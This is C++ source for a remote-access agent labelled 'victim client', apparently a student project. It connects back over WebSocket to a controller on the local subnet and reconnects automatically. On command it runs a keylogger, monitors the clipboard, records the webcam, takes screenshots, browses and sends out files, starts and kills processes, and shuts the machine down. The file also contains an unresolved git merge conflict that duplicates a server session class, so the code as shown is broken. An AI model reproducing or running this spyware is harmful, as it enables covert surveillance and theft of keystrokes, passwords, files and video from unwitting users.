// =============================================================
// AURALINK AGENT (VICTIM CLIENT)
// Tinh nang: Auto Detect Server & Execute Commands
// =============================================================

// --- CAU HINH WINDOWS ---
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 
#endif

#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/connect.hpp>
#include <cstdlib>      
#include <iostream>
#include <string>
#include <thread>
#include <memory>
#include <vector>
#include <fstream>
#include <windows.h>   
#include <iphlpapi.h> // Thu vien lay IP
#include <atomic> 
#include <iomanip>

// Cac module chuc nang
#include "Process.h"
#include "Keylogger.h"
#include "Webcam.h"
#include "Application.h"
#include "ScreenShot.h"
#include "TextToSpeech.h"
#include "Clipboard.h"
#include "FileTransfer.h"

// Link thu vien Windows
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib") 
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")

extern "C" __declspec(dllimport) BOOL __stdcall SetProcessDPIAware();

namespace beast = boost::beast;
namespace http = beast::http;
namespace websocket = beast::websocket;
namespace net = boost::asio;
using tcp = boost::asio::ip::tcp;

// =============================================================
// CẤU HÌNH KẾT NỐI
// =============================================================
const std::string MIDDLE_SERVER_PORT = "8080";

// --- HAM LOGIC DONG BO IP (QUAN TRONG) ---
// Server tu set IP minh thanh .100, nen Client cung se tim den .100
std::string GetSmartServerIP() {
    ULONG outBufLen = 15000;

    // [FIX LỖI E0144] Sua lai cach cast pointer cho dung chuan C++
    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);

    // Phong truong hop bo nho khong du
    if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
    }

    std::string targetIP = "127.0.0.1"; // Default neu khong tim thay mang

    if (pAdapterInfo && GetAdaptersInfo(pAdapterInfo, &outBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            std::string ip = pAdapter->IpAddressList.IpAddress.String;
            std::string gateway = pAdapter->GatewayList.IpAddress.String;

            // Chi lay mang co Internet (Gateway khac 0)
            if (ip != "0.0.0.0" && gateway != "0.0.0.0") {
                size_t lastDot = ip.find_last_of('.');
                if (lastDot != std::string::npos) {
                    std::string prefix = ip.substr(0, lastDot);

                    targetIP = prefix + ".100";
                    break; // Tim thay mang active la chot luon
                }
            }
            pAdapter = pAdapter->Next;
        }
    }
    if (pAdapterInfo) free(pAdapterInfo);
    return targetIP;
}

// =============================================================
// PHAN 1: CAC HAM HO TRO SYSTEM INFO 
// =============================================================

static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string base64_encode(const std::vector<char>& data) {
    std::string ret;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];
    size_t dataLen = data.size();
    size_t dataPos = 0;
    while (dataLen--) {
        char_array_3[i++] = data[dataPos++];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; (i < 4); i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while ((i++ < 3)) ret += '=';
    }
    return ret;
}

std::string GetComputerNameStr() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) return std::string(buffer);
    return "Unknown-PC";
}

std::string GetOSVersionStr() {
    std::string osName = "Unknown Windows";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char productName[255] = { 0 };
        DWORD dataSize = sizeof(productName);
        if (RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)productName, &dataSize) == ERROR_SUCCESS) {
            osName = std::string(productName);
        }
        RegCloseKey(hKey);
    }
    return osName;
}

std::string GetRamFree() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    double freeGB = (double)statex.ullAvailPhys / (1024 * 1024 * 1024);
    std::stringstream ss;
    ss << std::fixed << std::setprecision(1) << freeGB << " GB";
    return ss.str();
}

std::string GetRamUsagePercent() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    return std::to_string((int)statex.dwMemoryLoad);
}

std::string GetDiskFree() {
    ULARGE_INTEGER freeBytes, totalBytes, totalFree;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFree)) {
        double freeGB = (double)freeBytes.QuadPart / (1024 * 1024 * 1024);
        std::stringstream ss;
        ss << std::fixed << std::setprecision(0) << freeGB << " GB";
        return ss.str();
    }
    return "Unknown";
}

std::string GetProcessCount() {
    DWORD count = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do { count++; } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return std::to_string(count);
}

std::string GetCpuUsage() {
    FILETIME idleTime, kernelTime, userTime;
    if (!GetSystemTimes(&idleTime, &kernelTime, &userTime)) return "0";

    static unsigned long long prevTotal = 0;
    static unsigned long long prevIdle = 0;

    unsigned long long total =
        ((unsigned long long)kernelTime.dwHighDateTime << 32 | kernelTime.dwLowDateTime) +
        ((unsigned long long)userTime.dwHighDateTime << 32 | userTime.dwLowDateTime);

    unsigned long long idle =
        ((unsigned long long)idleTime.dwHighDateTime << 32 | idleTime.dwLowDateTime);

    unsigned long long diffTotal = total - prevTotal;
    unsigned long long diffIdle = idle - prevIdle;

    prevTotal = total;
    prevIdle = idle;

    if (diffTotal == 0) return "0";
    double usage = (100.0 * (diffTotal - diffIdle)) / diffTotal;
    if (usage < 0) usage = 0;
    if (usage > 100) usage = 100;
    return std::to_string((int)usage);
}

std::string GetBatteryStatus() {
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        if (sps.BatteryLifePercent == 255) return "Plugged In";
        return std::to_string(sps.BatteryLifePercent) + "%";
    }
    return "Unknown";
}

// Ham thuc hien lenh Shutdown/Restart
void DoShutdown(); 
void DoRestart(); 

std::thread g_webcamThread;

// =============================================================
// PHAN 2: XU LY KET NOI CLIENT (REVERSE CONNECTION)
// =============================================================

void RunAgent() {
    // Khoi tao cac module tinh (static)
    static Keylogger myKeylogger;
    static Process myProcessModule;
    static Application myAppModule;
    static Clipboard myClipboard;

    while (true) {
        try {
            // [SYNC] Tự động tính toán IP Server (.100)
            std::string currentServerIP = GetSmartServerIP();
            std::cout << "[INFO] Auto-detected Server IP: " << currentServerIP << "\n";

            net::io_context ioc;
            tcp::resolver resolver(ioc);

            // 1. Resolve dia chi Server
            auto const results = resolver.resolve(currentServerIP, MIDDLE_SERVER_PORT);

            // 2. Tao websocket
            websocket::stream<tcp::socket> ws(ioc);

            // 3. Ket noi TCP
            net::connect(ws.next_layer(), results.begin(), results.end());

            // 4. Handshake Websocket
            ws.handshake(currentServerIP, "/");

            std::cout << "[CONNECTED] Connected to MiddleServer at " << currentServerIP << "!\n";

            // 5. GUI DINH DANH
            std::string identity = "TYPE:VICTIM|" + GetComputerNameStr() + "|" + GetOSVersionStr();
            ws.write(net::buffer(identity));

            // 6. VONG LAP LANG NGHE LENH TU ADMIN
            beast::flat_buffer buffer;
            while (true) {
                // Doc lenh
                ws.read(buffer);
                std::string command = beast::buffers_to_string(buffer.data());
                buffer.consume(buffer.size());

                // --- XU LY LENH (GIU NGUYEN) ---
                if (command == "get-sys-info") {
                    std::string hostname = GetComputerNameStr();
                    std::string os = GetOSVersionStr();
                    std::string ramFree = GetRamFree();
                    std::string battery = GetBatteryStatus();
                    std::string diskFree = GetDiskFree();
                    std::string procCount = GetProcessCount();
                    std::string cpuUsage = GetCpuUsage();
                    std::string ramUsage = GetRamUsagePercent();

                    std::string response = "sys-info " + hostname + "|" + os + "|" + ramFree + "|" + battery + "|" + diskFree + "|" + procCount + "|" + cpuUsage + "|" + ramUsage;
                    ws.text(true); ws.write(net::buffer(response));
                }
                else if (command == "ping") {
                    ws.text(true); ws.write(net::buffer("pong"));
                }
                else if (command == "shutdown") {
                    ws.text(true); ws.write(net::buffer("Server: OK, shutting down in 15s..."));
                    std::this_thread::sleep_for(std::chrono::seconds(2));
                    DoShutdown();
                }
                else if (command == "restart") {
                    ws.text(true); ws.write(net::buffer("Server: OK, restarting in 15s..."));
                    std::this_thread::sleep_for(std::chrono::seconds(2));
                    DoRestart();
                }
                // --- MEDIA ---
                else if (command == "capture") {
                    if (g_webcamThread.joinable()) {
                        ws.text(true); ws.write(net::buffer("Server: Busy recording..."));
                    }
                    else {
                        ws.text(true); ws.write(net::buffer("Server: Started recording..."));
                        g_webcamThread = std::thread([&ws]() {
                            std::vector<char> videoData = CaptureWebcam(10);
                            if (!videoData.empty()) {
                                std::string encoded = base64_encode(videoData);
                                try {
                                    ws.text(true); ws.write(net::buffer("file " + encoded));
                                }
                                catch (...) {}
                            }
                            });
                        g_webcamThread.detach();
                    }
                }
                else if (command == "screenshot") {
                    ws.text(true); ws.write(net::buffer("Server: OK, capturing screenshot..."));
                    int width = GetSystemMetrics(SM_CXSCREEN);
                    int height = GetSystemMetrics(SM_CYSCREEN);
                    std::vector<std::uint8_t> pixels = ScreenShot();
                    if (pixels.empty()) {
                        ws.text(true); ws.write(net::buffer("Server: Error capturing screenshot."));
                    }
                    else {
                        std::vector<char> bytes(pixels.begin(), pixels.end());
                        std::string encoded = base64_encode(bytes);
                        std::string response = "screenshot " + std::to_string(width) + " " + std::to_string(height) + " " + encoded;
                        ws.text(true); ws.write(net::buffer(response));
                    }
                }
                // --- KEYLOGGER ---
                else if (command == "start-keylog") {
                    myKeylogger.StartKeyLogging();
                    ws.text(true); ws.write(net::buffer("Server: Keylogger started (background)..."));
                }
                else if (command == "stop-keylog") {
                    myKeylogger.StopKeyLogging();
                    ws.text(true); ws.write(net::buffer("Server: Keylogger stopped."));
                }
                else if (command == "get-keylog") {
                    std::string logs = myKeylogger.GetLoggedKeys();
                    ws.text(true); ws.write(net::buffer(logs));
                }
                // --- PROCESS ---
                else if (command == "ps") {
                    std::string list = myProcessModule.ListProcesses();
                    ws.text(true); ws.write(net::buffer(list));
                }
                else if (command.rfind("start ", 0) == 0) {
                    std::string appName = command.substr(6);
                    if (myProcessModule.StartProcess(appName)) ws.write(net::buffer("Server: Started successfully: " + appName));
                    else ws.write(net::buffer("Server: Error! Could not start: " + appName));
                }
                else if (command.rfind("kill ", 0) == 0) {
                    std::string target = command.substr(5);
                    ws.write(net::buffer("Server: " + myProcessModule.StopProcess(target)));
                }
                // --- APPS ---
                else if (command == "list-app") {
                    myAppModule.LoadInstalledApps();
                    auto apps = myAppModule.ListApplicationsWithStatus();
                    if (apps.empty()) ws.write(net::buffer("Server: No apps found."));
                    else {
                        std::string msg = "DANH SACH UNG DUNG\n";
                        for (size_t i = 0; i < apps.size(); ++i) {
                            msg += "[" + std::to_string(i) + "] " + apps[i].first.name + (apps[i].second ? " (RUNNING)" : "") + "\n";
                            msg += "Exe: " + apps[i].first.path + "\n";
                        }
                        ws.write(net::buffer(msg));
                    }
                }
                else if (command.rfind("start-app ", 0) == 0) {
                    std::string input = command.substr(10);
                    bool ok = myAppModule.StartApplication(input);
                    ws.write(net::buffer(ok ? "Server: Started " + input : "Server: Failed " + input));
                }
                else if (command.rfind("stop-app ", 0) == 0) {
                    std::string input = command.substr(9);
                    bool ok = myAppModule.StopApplication(input);
                    ws.write(net::buffer(ok ? "Server: Stopped " + input : "Server: Failed stop " + input));
                }
                // --- TTS & CLIPBOARD ---
                else if (command.rfind("tts ", 0) == 0) {
                    std::string text = command.substr(4);
                    static TextToSpeech myTTS;
                    myTTS.Speak(text);
                    ws.write(net::buffer("Server: OK, speaking"));
                }
                else if (command == "start-clip") {
                    myClipboard.StartMonitoring();
                    ws.write(net::buffer("Server: Clipboard Monitor STARTED"));
                }
                else if (command == "stop-clip") {
                    myClipboard.StopMonitoring();
                    ws.write(net::buffer("Server: Clipboard Monitor STOPPED"));
                }
                else if (command == "get-clip") {
                    std::string logs = myClipboard.GetLogs();
                    if (logs.empty()) logs = "[No clipboard data]";
                    ws.write(net::buffer("CLIPBOARD_DATA:\n" + logs));
                }
                // --- FILE TRANSFER ---
                else if (command.rfind("download-file ", 0) == 0) {
                    std::string filepath = command.substr(14);
                    // Trim space
                    filepath.erase(0, filepath.find_first_not_of(" \n\r\t"));
                    filepath.erase(filepath.find_last_not_of(" \n\r\t") + 1);
                    std::string response = FileTransfer::HandleDownloadRequest(filepath);
                    ws.write(net::buffer(response));
                }
                else if (command == "ls" || command.rfind("ls ", 0) == 0) {
                    std::string targetPath;

                    if (command == "ls") {
                        targetPath = "MyComputer";
                    }
                    else {
                        targetPath = command.substr(3);
                    }

                    std::string result = FileTransfer::ListDirectory(targetPath);

                    ws.text(true);
                    ws.write(net::buffer(result));
                    }
            }
        }
        catch (std::exception const& e) {
            std::cerr << "[ERROR] Connection lost: " << e.what() << "\n";
            std::cerr << "[RETRY] Reconnecting in 5 seconds...\n";
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }
}

<<<<<<< HEAD
=======
void DoShutdown();
void DoRestart();
std::thread g_webcamThread;
void fail(beast::error_code ec, char const* what) { std::cerr << what << ": " << ec.message() << "\n"; }

// =============================================================
// PHAN 2: XU LY KET NOI (SESSION)
// =============================================================

class session : public std::enable_shared_from_this<session> {
    websocket::stream<beast::tcp_stream> ws_;
    beast::flat_buffer buffer_;
public:
    explicit session(tcp::socket&& socket) : ws_(std::move(socket)) {}
    void run() {
        ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));
        ws_.async_accept(beast::bind_front_handler(&session::on_accept, shared_from_this()));
    }
    void on_accept(beast::error_code ec) { if (ec) return fail(ec, "Accept Error"); do_read(); }
    void do_read() { ws_.async_read(buffer_, beast::bind_front_handler(&session::on_read, shared_from_this())); }

    void on_read(beast::error_code ec, std::size_t bytes_transferred) {
        boost::ignore_unused(bytes_transferred);
        if (ec == websocket::error::closed) return;
        if (ec) return fail(ec, "Read Error");

        if (ws_.got_text()) {
            std::string command = beast::buffers_to_string(buffer_.data());

            static Keylogger myKeylogger;
            static Process myProcessModule;
            static Application myAppModule;
            static Clipboard myClipboard;
            // ---------------------------------------------------------
            // [SECTION 1] SYSTEM INFO, PING, POWER
            // ---------------------------------------------------------
            if (command == "get-sys-info") {
                std::string hostname = GetComputerNameStr();
                std::string os = GetOSVersionStr();

                std::string ramFree = GetRamFree();
                std::string battery = GetBatteryStatus();
                std::string diskFree = GetDiskFree();
                std::string procCount = GetProcessCount();

                std::string cpuUsage = GetCpuUsage();
                std::string ramUsage = GetRamUsagePercent();

                // Format: sys-info Host|OS|RAMFree|Battery|DiskFree|ProcessCount|CPU%|RAM%
                std::string response = "sys-info " + hostname + "|" + os + "|" + ramFree + "|" + battery + "|" + diskFree + "|" + procCount + "|" + cpuUsage + "|" + ramUsage;

                ws_.text(true);
                ws_.write(net::buffer(response));
            }
            else if (command == "ping") {
                ws_.text(true); ws_.write(net::buffer("pong"));
            }
            else if (command == "shutdown") {
                ws_.text(true); ws_.write(net::buffer("Server: OK, shutting down in 15s...")); DoShutdown();
            }
            else if (command == "restart") {
                ws_.text(true); ws_.write(net::buffer("Server: OK, restarting in 15s...")); DoRestart();
            }

            // ---------------------------------------------------------
            // [SECTION 2] MEDIA (WEBCAM & SCREENSHOT)
            // ---------------------------------------------------------
            else if (command == "capture") {
                if (g_webcamThread.joinable()) {
                    ws_.text(true); ws_.write(net::buffer("Server: Busy recording..."));
                }
                else {
                    ws_.text(true); ws_.write(net::buffer("Server: Started recording..."));
                    auto self = shared_from_this();
                    g_webcamThread = std::thread([self]() {
                        std::vector<char> videoData = CaptureWebcam(10);
                        if (!videoData.empty()) {
                            std::string encoded = base64_encode(videoData);
                            try { self->ws_.text(true); self->ws_.write(net::buffer("file " + encoded)); }
                            catch (...) {}
                        }
                        });
                    g_webcamThread.detach();
                }
            }
            else if (command == "screenshot") {
                ws_.text(true); ws_.write(net::buffer("Server: OK, capturing screenshot..."));
                int width = GetSystemMetrics(SM_CXSCREEN);
                int height = GetSystemMetrics(SM_CYSCREEN);
                std::vector<std::uint8_t> pixels = ScreenShot();
                if (pixels.empty()) {
                    ws_.text(true); ws_.write(net::buffer("Server: Error capturing screenshot."));
                }
                else {
                    std::vector<char> bytes(pixels.begin(), pixels.end());
                    std::string encoded = base64_encode(bytes);
                    std::string response = "screenshot " + std::to_string(width) + " " + std::to_string(height) + " " + encoded;
                    ws_.text(true); ws_.write(net::buffer(response));
                }
            }

            // ---------------------------------------------------------
            // [SECTION 3] KEYLOGGER
            // ---------------------------------------------------------
            else if (command == "start-keylog") { myKeylogger.StartKeyLogging(); ws_.text(true); ws_.write(net::buffer("Server: Keylogger started (background)...")); }
            else if (command == "stop-keylog") { myKeylogger.StopKeyLogging(); ws_.text(true); ws_.write(net::buffer("Server: Keylogger stopped.")); }
            else if (command == "get-keylog") {
                std::string logs = myKeylogger.GetLoggedKeys();
                // Không cần check empty vì hàm GetLoggedKeys luôn trả về header MODE:...

                // Gửi trực tiếp logs (đã có sẵn header MODE:...) để Client tự tách
                ws_.text(true); ws_.write(net::buffer(logs));
            }

            // ---------------------------------------------------------
            // [SECTION 4] PROCESS MANAGEMENT
            // ---------------------------------------------------------
            else if (command == "ps") {
                std::string list = myProcessModule.ListProcesses();
                ws_.text(true); ws_.write(net::buffer(list));
            }
            else if (command.rfind("start ", 0) == 0) {
                std::string appName = command.substr(6);
                if (myProcessModule.StartProcess(appName)) {
                    ws_.text(true); ws_.write(net::buffer("Server: Started successfully: " + appName));
                }
                else {
                    ws_.text(true); ws_.write(net::buffer("Server: Error! Could not start: " + appName));
                }
            }
            else if (command.rfind("kill ", 0) == 0) {
                std::string target = command.substr(5);
                std::string result = myProcessModule.StopProcess(target);
                ws_.text(true); ws_.write(net::buffer("Server: " + result));
            }

            // ---------------------------------------------------------
            // [SECTION 5] APPLICATION MANAGEMENT
            // ---------------------------------------------------------
            else if (command == "list-app") {
                myAppModule.LoadInstalledApps();

                auto apps = myAppModule.ListApplicationsWithStatus();
                ws_.text(true);
                if (apps.empty()) ws_.write(net::buffer("Server: No apps found in Registry."));
                else {
                    std::string msg = "DANH SACH UNG DUNG\n";

                    for (size_t i = 0; i < apps.size(); ++i) {
                        msg += "[" + std::to_string(i) + "] " + apps[i].first.name + (apps[i].second ? " (RUNNING)" : "") + "\n";
                        msg += "Exe: " + apps[i].first.path + "\n";
                    }
                    ws_.write(net::buffer(msg));
                }
            }
            else if (command.rfind("start-app ", 0) == 0) {
                std::string input = command.substr(10);
                bool ok = myAppModule.StartApplication(input);
                ws_.text(true); ws_.write(net::buffer(ok ? "Server: Started " + input : "Server: Failed " + input));
            }
            else if (command.rfind("stop-app ", 0) == 0) {
                std::string input = command.substr(9);
                bool ok = myAppModule.StopApplication(input);
                ws_.text(true); ws_.write(net::buffer(ok ? "Server: Stopped " + input : "Server: Failed stop " + input));
            }
            // ---------------------------------------------------------
            // [SECTION 6] TEXT TO SPEECH (VUI NHON)
            // ---------------------------------------------------------
            else if (command.rfind("tts ", 0) == 0) {
                // Cu phap: tts Hello Teacher
                std::string textToSpeak = command.substr(4); // Cat bo chu "tts "

                static TextToSpeech myTTS; // Khoi tao static de dung chung
                myTTS.Speak(textToSpeak);

                ws_.text(true);
                ws_.write(net::buffer("Server: OK, speaking: \"" + textToSpeak + "\""));
            }
            // ---------------------------------------------------------
            // [SECTION 7] CLIPBOARD MONITOR (THEO DÕI COPY/PASTE)
            // ---------------------------------------------------------
            else if (command == "start-clip") {
                myClipboard.StartMonitoring();
                ws_.text(true);
                ws_.write(net::buffer("Server: Clipboard Monitor STARTED (Background)..."));
            }
            else if (command == "stop-clip") {
                myClipboard.StopMonitoring();
                ws_.text(true);
                ws_.write(net::buffer("Server: Clipboard Monitor STOPPED."));
            }
            else if (command == "get-clip") {
                std::string logs = myClipboard.GetLogs();
                if (logs.empty()) logs = "[No clipboard data recorded]";

                // Gửi dữ liệu về Client
                ws_.text(true);
                ws_.write(net::buffer("CLIPBOARD_DATA:\n" + logs));
            }
            // ---------------------------------------------------------
            // [SECTION 8] FILE TRANSFER (DOWNLOAD FILE) 
            // ---------------------------------------------------------
            else if (command.rfind("download-file ", 0) == 0) {
                std::string filepath = command.substr(14);

                filepath.erase(0, filepath.find_first_not_of(" \n\r\t"));
                filepath.erase(filepath.find_last_not_of(" \n\r\t") + 1);

                std::string response = FileTransfer::HandleDownloadRequest(filepath);

                ws_.text(true);
                ws_.write(net::buffer(response));

                if (response.find("FILE_DOWNLOAD") == 0) {
                    std::cout << "File sent successfully: " << filepath << "\n";
                }
                else {
                    std::cout << "File send failed: " << filepath << "\n";
                }
            }
            else if (command.rfind("ls ", 0) == 0) {
                // Lệnh: ls <đường dẫn> (Ví dụ: ls D:\Data)
                std::string path = command.substr(3);
                std::string result = FileTransfer::ListDirectory(path);
                ws_.text(true);
                ws_.write(net::buffer(result));
            }
            else if (command == "ls") {
                // Lệnh: ls (Mặc định lấy ổ C)
                std::string result = FileTransfer::ListDirectory("C:\\");
                ws_.text(true);
                ws_.write(net::buffer(result));
            }
        }
        buffer_.consume(buffer_.size());
        do_read();
    }
};

class listener : public std::enable_shared_from_this<listener> {
    net::io_context& ioc_;
    tcp::acceptor acceptor_;
public:
    listener(net::io_context& ioc, tcp::endpoint endpoint) : ioc_(ioc), acceptor_(ioc) {
        beast::error_code ec;
        acceptor_.open(endpoint.protocol(), ec);
        if (ec) { fail(ec, "Open Error"); return; }
        acceptor_.set_option(net::socket_base::reuse_address(true), ec);
        if (ec) { fail(ec, "Set Option Error"); return; }
        acceptor_.bind(endpoint, ec);
        if (ec) { fail(ec, "Bind Error"); return; }
        acceptor_.listen(net::socket_base::max_listen_connections, ec);
        if (ec) { fail(ec, "Listen Error"); return; }
    }
    void run() { do_accept(); }
private:
    void do_accept() { acceptor_.async_accept(net::make_strand(ioc_), beast::bind_front_handler(&listener::on_accept, shared_from_this())); }
    void on_accept(beast::error_code ec, tcp::socket socket) {
        if (ec) fail(ec, "Accept Error");
        else std::make_shared<session>(std::move(socket))->run();
        do_accept();
    }
};

>>>>>>> 8b412ae054e6f54a216f30dc03a6528c766fc5ec
int main() {
    // Cai dat DPI Aware
    SetProcessDPIAware();

    std::cout << "========================================\n";
    std::cout << "   AURALINK AGENT (SMART CLIENT)\n";
    std::cout << "========================================\n";
    std::cout << "AUTO DETECTING SERVER IP...\n";

    RunAgent();

    return EXIT_SUCCESS;
}